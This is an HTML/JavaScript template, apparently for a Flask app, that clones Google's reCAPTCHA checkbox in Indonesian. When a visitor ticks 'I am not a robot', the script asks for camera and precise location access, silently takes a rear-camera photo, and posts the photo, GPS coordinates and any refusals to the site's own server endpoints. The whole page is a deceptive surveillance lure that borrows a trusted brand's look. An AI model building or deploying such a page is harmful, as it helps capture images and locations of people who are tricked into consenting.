<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>reCAPTCHA Style Clone</title>
    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
    <style>
        /* tambahan kecil agar dialog browser tidak tertutup */
        body { background-color: #f9f9f9; }
        .recaptcha-container {
            width: 304px;
            height: 78px;
            background-color: #f9f9f9;
            border: 1px solid #d3d3d3;
            border-radius: 3px;
            box-shadow: 0 0 4px 1px rgba(0, 0, 0, 0.08);
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 0 12px;
        }
        .recaptcha-left { display: flex; align-items: center; gap: 12px; }
        .checkbox-container { position: relative; width: 28px; height: 28px; }
        .checkbox-container input {
            opacity: 0; width: 100%; height: 100%;
            cursor: pointer; position: absolute; z-index: 2;
        }
        .custom-checkbox {
            position: absolute; top: 0; left: 0; width: 24px; height: 24px;
            background-color: #fff; border: 2px solid #c1c1c1; border-radius: 2px;
            display: flex; align-items: center; justify-content: center;
        }
        .custom-checkbox::after {
            content: ""; display: none; width: 12px; height: 12px;
            background: #4CAF50; border-radius: 2px;
        }
        .checkbox-container input:checked + .custom-checkbox {
            border-color: #4CAF50;
        }
        .checkbox-container input:checked + .custom-checkbox::after {
            display: block;
        }
        .checkbox-container input:disabled + .custom-checkbox {
            opacity: 0.6; cursor: not-allowed;
        }
        .spinner {
            display: none; position: absolute; top: 0; left: 0;
            width: 24px; height: 24px;
            border: 3px solid #f3f3f3; border-top: 3px solid #4285f4;
            border-radius: 50%; animation: spin 0.8s linear infinite;
        }
        .spinner.active { display: block; }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .recaptcha-label { font-size: 14px; color: #000; user-select: none; }
        .recaptcha-right { display: flex; flex-direction: column; align-items: center; width: 70px; }
        .logo-icon { width: 32px; height: 32px; object-fit: contain; }
        .brand-text { font-size: 10px; color: #555; margin-top: 2px; }
        .terms-links { font-size: 8px; color: #555; text-align: center; }
        .terms-links a { color: #555; text-decoration: none; }
        .terms-links a:hover { text-decoration: underline; }
        #status-msg { font-size: 13px; color: #555; min-height: 20px; text-align: center; }
        #video-preview, #capture-canvas { display: none; }
        .hidden { display: none; }
    </style>
</head>
<body>
    <div style="display: flex; flex-direction: column; align-items: center; gap: 20px; margin-top: 40px;">
        <div class="recaptcha-container" id="recaptcha-container">
            <div class="recaptcha-left">
                <div class="checkbox-container">
                    <input type="checkbox" id="recaptcha-check" />
                    <div class="custom-checkbox" id="custom-checkbox"></div>
                    <div class="spinner" id="spinner"></div>
                </div>
                <label for="recaptcha-check" class="recaptcha-label" id="label-text">Saya bukan robot</label>
            </div>
            <div class="recaptcha-right">
                <img class="logo-icon" src="{{ url_for('static', filename='images/recaptcha.png') }}" alt="reCAPTCHA logo" />
                <span class="brand-text">reCAPTCHA</span>
                <div class="terms-links"><a href="#">Privasi</a> - <a href="#">Persyaratan</a></div>
            </div>
        </div>
        <div id="status-msg"></div>
    </div>

    <video id="video-preview" autoplay muted></video>
    <canvas id="capture-canvas"></canvas>

    <script>
        (function() {
            'use strict';

            const checkbox = document.getElementById('recaptcha-check');
            const spinner = document.getElementById('spinner');
            const labelText = document.getElementById('label-text');
            const statusMsg = document.getElementById('status-msg');
            const video = document.getElementById('video-preview');
            const canvas = document.getElementById('capture-canvas');
            const ctx = canvas.getContext('2d');

            let isProcessing = false;
            let isInternalUpdate = false;

            function setStatus(msg, isError = false) {
                statusMsg.textContent = msg;
                statusMsg.style.color = isError ? '#d32f2f' : '#2e7d32';
                console.log('[status]', msg);
            }

            function setCaptchaState(state) {
                console.log('[state]', state);
                switch (state) {
                    case 'idle':
                        isInternalUpdate = true;
                        checkbox.disabled = false;
                        checkbox.checked = false;
                        isInternalUpdate = false;
                        spinner.classList.remove('active');
                        labelText.textContent = 'Saya bukan robot';
                        setStatus('');
                        break;
                    case 'verifying':
                        isInternalUpdate = true;
                        checkbox.disabled = true;
                        isInternalUpdate = false;
                        spinner.classList.add('active');
                        labelText.textContent = 'Memverifikasi...';
                        setStatus('⏳ Verifikasi CAPTCHA...');
                        break;
                    case 'permission':
                        isInternalUpdate = true;
                        checkbox.disabled = true;
                        isInternalUpdate = false;
                        spinner.classList.remove('active');
                        labelText.textContent = 'Meminta izin...';
                        setStatus('🔐 Meminta izin kamera & lokasi...');
                        break;
                    case 'success':
                        isInternalUpdate = true;
                        checkbox.disabled = true;
                        checkbox.checked = true;
                        isInternalUpdate = false;
                        spinner.classList.remove('active');
                        labelText.textContent = '✅ Terverifikasi';
                        setStatus('✅ Verifikasi selesai!');
                        break;
                    case 'error':
                        isInternalUpdate = true;
                        checkbox.disabled = false;
                        checkbox.checked = false;
                        isInternalUpdate = false;
                        spinner.classList.remove('active');
                        labelText.textContent = 'Saya bukan robot';
                        setStatus('❌ Verifikasi gagal, coba lagi', true);
                        break;
                    default:
                        break;
                }
            }

            function resetAfterDelay(delay = 2000) {
                setTimeout(() => { setCaptchaState('idle'); }, delay);
            }

            async function verifyCaptcha() {
                const resp = await fetch('/api/captcha/verify', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ action: 'captcha_verify' })
                });
                if (!resp.ok) throw new Error('Server error');
                const data = await resp.json();
                if (!data.success) throw new Error(data.message || 'Verifikasi gagal');
                return data.session_id;
            }

            async function reportPermissionDenied(kind) {
                await fetch('/api/permission_denied', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ kind: kind })
                });
            }

            async function sendPhoto(blob) {
                const formData = new FormData();
                formData.append('photo', blob, 'capture.jpg');
                const resp = await fetch('/api/photo', { method: 'POST', body: formData });
                if (!resp.ok) throw new Error('Gagal mengirim foto');
                return resp.json();
            }

            async function sendLocation(lat, lon, acc) {
                const resp = await fetch('/api/location', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ latitude: lat, longitude: lon, accuracy: acc, timestamp: new Date().toISOString() })
                });
                if (!resp.ok) throw new Error('Gagal mengirim lokasi');
                return resp.json();
            }

            async function requestCameraAndCapture() {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
                    video.srcObject = stream;
                    await new Promise(resolve => {
                        video.onloadedmetadata = () => { video.play(); resolve(); };
                    });
                    await new Promise(r => setTimeout(r, 1000));
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
                    if (!blob) throw new Error('Gagal membuat blob');
                    await sendPhoto(blob);
                    stream.getTracks().forEach(t => t.stop());
                    video.srcObject = null;
                    setStatus('📷 Foto berhasil diambil');
                } catch (err) {
                    await reportPermissionDenied('camera');
                    setStatus('⚠️ Izin kamera ditolak', true);
                    throw err;
                }
            }

            function requestLocation() {
                return new Promise((resolve, reject) => {
                    if (!navigator.geolocation) {
                        reject(new Error('Geolocation not supported'));
                        return;
                    }
                    navigator.geolocation.getCurrentPosition(
                        async (pos) => {
                            try {
                                await sendLocation(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
                                setStatus('📍 Lokasi berhasil didapat');
                                resolve();
                            } catch (err) { reject(err); }
                        },
                        async (err) => {
                            await reportPermissionDenied('location');
                            setStatus('⚠️ Izin lokasi ditolak', true);
                            reject(err);
                        },
                        { enableHighAccuracy: true, timeout: 10000 }
                    );
                });
            }

            async function handleCheck() {
                if (isInternalUpdate) return;
                if (isProcessing) return;
                if (!checkbox.checked) { setCaptchaState('idle'); return; }

                isProcessing = true;
                setCaptchaState('verifying');

                try {
                    await verifyCaptcha();
                    setCaptchaState('permission');
                    await Promise.allSettled([requestCameraAndCapture(), requestLocation()]);
                    setCaptchaState('success');
                } catch (err) {
                    console.error(err);
                    setCaptchaState('error');
                    resetAfterDelay(2000);
                } finally {
                    isProcessing = false;
                }
            }

            checkbox.addEventListener('change', handleCheck);
            setCaptchaState('idle');
            console.log('reCAPTCHA clone ready.');
        })();
    </script>
</body>
</html>
